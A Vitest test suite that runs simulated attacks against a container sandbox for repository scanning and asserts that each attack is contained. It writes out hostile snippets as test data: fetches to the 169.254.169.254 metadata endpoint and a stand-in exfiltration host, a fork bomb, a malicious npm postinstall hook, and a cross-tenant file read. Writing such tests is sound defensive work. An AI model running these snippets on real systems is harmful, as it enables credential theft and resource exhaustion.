import fs from "fs";
import http from "http";
import path from "path";
import { describe, expect, it, beforeEach, afterEach } from "vitest";
import {
  purgeTokenFromWorkspace,
  runInContainerSandbox,
  sanitizeSandboxEnvironment,
} from "../src/index.js";

interface AttackResult {
  attackScenario: string;
  threatVector: string;
  expectedBehavior: string;
  actualOutcome: string;
  verdict: "PASS" | "FAIL";
}

describe("Malicious Repository Sandbox Penetration & Attack Suite (packages/worker)", () => {
  const testResults: AttackResult[] = [];
  let testLocalServer: http.Server | null = null;
  let localServerPort = 0;

  beforeEach(async () => {
    // Spin up a local dummy server to simulate a sensitive localhost service
    await new Promise<void>((resolve) => {
      testLocalServer = http.createServer((_req, res) => {
        res.writeHead(200, { "Content-Type": "text/plain" });
        res.end("CONFIDENTIAL_LOCAL_SERVICE_RESPONSE");
      });
      testLocalServer.listen(0, "127.0.0.1", () => {
        const addr = testLocalServer?.address();
        if (addr && typeof addr === "object") {
          localServerPort = addr.port;
        }
        resolve();
      });
    });
  });

  afterEach(async () => {
    if (testLocalServer) {
      await new Promise<void>((resolve) => testLocalServer?.close(() => resolve()));
    }
  });

  it("ATTACK VECTOR 1: Environment & File Secret Exfiltration Attempt", async () => {
    const maliciousEnvInput = {
      SESSION_SECRET: "super_secret_session_key_12345",
      GITHUB_CLIENT_SECRET: "gh_client_secret_xyz987",
      AWS_SECRET_ACCESS_KEY: "aws_secret_key_qwerty",
      PUBLIC_CONFIG: "safe_public_setting",
    };

    const sanitizedEnv = sanitizeSandboxEnvironment(maliciousEnvInput);

    // SECURITY ASSERTION: Forbidden host secrets MUST NOT exist in sandbox env
    const secretsLeaked =
      sanitizedEnv.SESSION_SECRET !== undefined ||
      sanitizedEnv.GITHUB_CLIENT_SECRET !== undefined ||
      sanitizedEnv.AWS_SECRET_ACCESS_KEY !== undefined;

    const actualOutcome = secretsLeaked
      ? "Host secrets leaked into sandbox environment"
      : "All host secrets stripped; only safe config passed";

    const verdict = !secretsLeaked ? "PASS" : "FAIL";

    testResults.push({
      attackScenario: "Environment Secret Exfiltration",
      threatVector: "Reading process.env for SESSION_SECRET/AWS keys",
      expectedBehavior: "All host secrets stripped from environment",
      actualOutcome,
      verdict,
    });

    expect(secretsLeaked).toBe(false);
    expect(sanitizedEnv.PUBLIC_CONFIG).toBe("safe_public_setting");
  });

  it("ATTACK VECTOR 2: Egress Attacks (Cloud Metadata 169.254.169.254, Localhost, Arbitrary Hosts)", async () => {
    const workspaceDir = path.resolve(process.cwd(), "temp/test_attack_workspace");
    if (!fs.existsSync(workspaceDir)) fs.mkdirSync(workspaceDir, { recursive: true });

    // Script attempting egress to AWS IMDS metadata (169.254.169.254), Localhost, and Arbitrary Host
    const attackScript = `
      const http = require('http');
      
      function tryFetch(url) {
        return new Promise((resolve) => {
          const req = http.get(url, { timeout: 1000 }, (res) => {
            let body = '';
            res.on('data', (d) => body += d);
            res.on('end', () => resolve({ success: true, body }));
          });
          req.on('error', (err) => resolve({ success: false, error: err.message }));
          req.on('timeout', () => { req.destroy(); resolve({ success: false, error: 'timeout' }); });
        });
      }

      async function runAttacks() {
        const metadata = await tryFetch('http://169.254.169.254/latest/meta-data/');
        const localhost = await tryFetch('http://127.0.0.1:${localServerPort}');
        const arbitrary = await tryFetch('http://malicious-exfiltration-target.com');

        console.log(JSON.stringify({ metadata, localhost, arbitrary }));
      }
      runAttacks();
    `;

    fs.writeFileSync(path.join(workspaceDir, "attack.js"), attackScript);

    const result = await runInContainerSandbox({
      workspaceDir,
      command: ["node", "attack.js"],
      timeoutMs: 5000,
    });

    let attackOutput: {
      metadata: { success: boolean };
      localhost: { success: boolean; body?: string };
      arbitrary: { success: boolean };
    } = {
      metadata: { success: false },
      localhost: { success: false },
      arbitrary: { success: false },
    };
    try {
      if (result.stdout.trim()) {
        attackOutput = JSON.parse(result.stdout.trim());
      }
    } catch {
      // Parse error or container blocked network stdout
    }

    const metadataExfiltered = attackOutput.metadata.success;
    const localhostExfiltered =
      attackOutput.localhost.success &&
      String(attackOutput.localhost.body).includes("CONFIDENTIAL");
    const arbitraryExfiltered = attackOutput.arbitrary.success;

    const anyExfiltered = metadataExfiltered || localhostExfiltered || arbitraryExfiltered;
    const actualOutcome = anyExfiltered
      ? "Egress connection succeeded"
      : "Metadata (169.254.169.254), Localhost, and Internet egress blocked/failed";

    const verdict = !anyExfiltered ? "PASS" : "FAIL";

    testResults.push({
      attackScenario: "Egress & Cloud Metadata Exfiltration",
      threatVector: "Fetching 169.254.169.254, Localhost port, External IP",
      expectedBehavior: "All egress connections blocked or failed",
      actualOutcome,
      verdict,
    });

    expect(metadataExfiltered).toBe(false);
    expect(localhostExfiltered).toBe(false);
    expect(arbitraryExfiltered).toBe(false);

    if (fs.existsSync(workspaceDir)) fs.rmSync(workspaceDir, { recursive: true, force: true });
  });

  it("ATTACK VECTOR 3: Resource Exhaustion (Disk Fill, Fork Bomb, Infinite Loop)", async () => {
    const workspaceDir = path.resolve(process.cwd(), "temp/test_resource_workspace");
    if (!fs.existsSync(workspaceDir)) fs.mkdirSync(workspaceDir, { recursive: true });

    // 1. Fork bomb script
    const forkBombScript = `
      const { fork } = require('child_process');
      if (process.argv[2] === 'child') {
        while(true) {}
      } else {
        for (let i = 0; i < 500; i++) {
          try { fork(__filename, ['child']); } catch {}
        }
      }
    `;
    fs.writeFileSync(path.join(workspaceDir, "forkbomb.js"), forkBombScript);

    const forkBombRes = await runInContainerSandbox({
      workspaceDir,
      command: ["node", "forkbomb.js"],
      timeoutMs: 1500,
    });

    const forkBombContained = forkBombRes.contained;

    // 2. Infinite Loop script
    const loopScript = `while(true) {}`;
    fs.writeFileSync(path.join(workspaceDir, "loop.js"), loopScript);

    const loopRes = await runInContainerSandbox({
      workspaceDir,
      command: ["node", "loop.js"],
      timeoutMs: 1000,
    });

    const loopContained =
      loopRes.contained && (loopRes.exitCode !== 0 || loopRes.violationReason?.includes("timeout"));

    const actualOutcome =
      forkBombContained && loopContained
        ? "Fork bomb stopped by PID cap; infinite loop killed by timeout"
        : "Resource limits failed to contain process";

    const verdict = forkBombContained && loopContained ? "PASS" : "FAIL";

    testResults.push({
      attackScenario: "Resource Exhaustion (Fork Bomb & Infinite Loop)",
      threatVector: "Spawning 500 processes & infinite CPU loop",
      expectedBehavior: "Processes contained and killed by timeout / PID limits",
      actualOutcome,
      verdict,
    });

    expect(forkBombContained).toBe(true);
    expect(loopContained).toBe(true);

    if (fs.existsSync(workspaceDir)) fs.rmSync(workspaceDir, { recursive: true, force: true });
  });

  it("ATTACK VECTOR 4: Malicious postinstall Script & Package.json Phone Home Attempt", async () => {
    const workspaceDir = path.resolve(process.cwd(), "temp/test_postinstall_workspace");
    if (!fs.existsSync(workspaceDir)) fs.mkdirSync(workspaceDir, { recursive: true });

    const sentinelFile = path.join(workspaceDir, "postinstall_ran.txt");

    const packageJsonContent = JSON.stringify({
      name: "malicious-package",
      version: "1.0.0",
      scripts: {
        postinstall: `node -e "require('fs').writeFileSync('${sentinelFile.replaceAll("\\", "/")}', 'HACKED')"`,
      },
    });

    fs.writeFileSync(path.join(workspaceDir, "package.json"), packageJsonContent);

    // Execute dependency install step with lifecycle scripts disabled (--ignore-scripts)
    await runInContainerSandbox({
      workspaceDir,
      command: ["npm", "install", "--ignore-scripts"],
      disableLifecycleScripts: true,
      timeoutMs: 5000,
    });

    const postinstallExecuted = fs.existsSync(sentinelFile);

    const actualOutcome = postinstallExecuted
      ? "postinstall lifecycle script executed!"
      : "postinstall script suppressed by --ignore-scripts flag";

    const verdict = !postinstallExecuted ? "PASS" : "FAIL";

    testResults.push({
      attackScenario: "Malicious Package postinstall Script Execution",
      threatVector: "npm postinstall script executing arbitrary code",
      expectedBehavior: "Lifecycle script suppressed via --ignore-scripts",
      actualOutcome,
      verdict,
    });

    expect(postinstallExecuted).toBe(false);

    if (fs.existsSync(workspaceDir)) fs.rmSync(workspaceDir, { recursive: true, force: true });
  });

  it("ATTACK VECTOR 5: Cross-Tenant Workspace Contamination Attempt", async () => {
    const jobADir = path.resolve(process.cwd(), "temp/scans/job_tenant_A");
    const jobBDir = path.resolve(process.cwd(), "temp/scans/job_tenant_B");

    if (fs.existsSync(jobADir)) fs.rmSync(jobADir, { recursive: true, force: true });
    if (fs.existsSync(jobBDir)) fs.rmSync(jobBDir, { recursive: true, force: true });

    fs.mkdirSync(jobADir, { recursive: true });
    fs.mkdirSync(jobBDir, { recursive: true });

    fs.writeFileSync(path.join(jobBDir, "tenant_b_secret.txt"), "TENANT_B_CONFIDENTIAL_DATA");

    // Script in Job A workspace trying to read Job B's file
    const attackScript = `
      const fs = require('fs');
      try {
        const content = fs.readFileSync('${jobBDir.replaceAll("\\", "/")}/tenant_b_secret.txt', 'utf-8');
        console.log("EXFILTRATED:" + content);
      } catch (err) {
        console.log("BLOCKED:" + err.message);
      }
    `;

    fs.writeFileSync(path.join(jobADir, "cross_attack.js"), attackScript);

    // Purge git tokens from workspace A
    purgeTokenFromWorkspace(jobADir);

    const sandboxRes = await runInContainerSandbox({
      workspaceDir: jobADir,
      command: ["node", "cross_attack.js"],
      timeoutMs: 3000,
    });

    const exfiltered = sandboxRes.stdout.includes("TENANT_B_CONFIDENTIAL_DATA");

    const actualOutcome = exfiltered
      ? "Tenant A read Tenant B's workspace file!"
      : "Cross-tenant access blocked or contained";

    const verdict = !exfiltered ? "PASS" : "FAIL";

    testResults.push({
      attackScenario: "Cross-Tenant Workspace Contamination",
      threatVector: "Job A attempting to read Job B's workspace file",
      expectedBehavior: "Cross-tenant access blocked or contained",
      actualOutcome,
      verdict,
    });

    expect(exfiltered).toBe(false);

    if (fs.existsSync(jobADir)) fs.rmSync(jobADir, { recursive: true, force: true });
    if (fs.existsSync(jobBDir)) fs.rmSync(jobBDir, { recursive: true, force: true });
  });

  it("SUMMARY REPORT: Print Malicious Repo Sandbox Attack Penetration Results Matrix Table", () => {
    console.log(
      "\n=================== MALICIOUS REPO SANDBOX PENETRATION RESULTS MATRIX ===================\n"
    );
    console.log(
      "| Attack Scenario | Threat Vector | Expected Behavior | Actual Outcome | Verdict |"
    );
    console.log(
      "|-----------------|---------------|-------------------|----------------|---------|"
    );
    for (const r of testResults) {
      const pScenario = r.attackScenario.padEnd(28, " ");
      const pVector = r.threatVector.padEnd(30, " ");
      const pExpected = r.expectedBehavior.padEnd(35, " ");
      const pOutcome = r.actualOutcome.padEnd(45, " ");
      const pVerdict = r.verdict.padEnd(7, " ");
      console.log(`| ${pScenario} | ${pVector} | ${pExpected} | ${pOutcome} | ${pVerdict} |`);
    }
    console.log(
      "\n================================================================-------------------------\n"
    );

    const allPassed = testResults.every((r) => r.verdict === "PASS");
    expect(allPassed).toBe(true);
  });
});
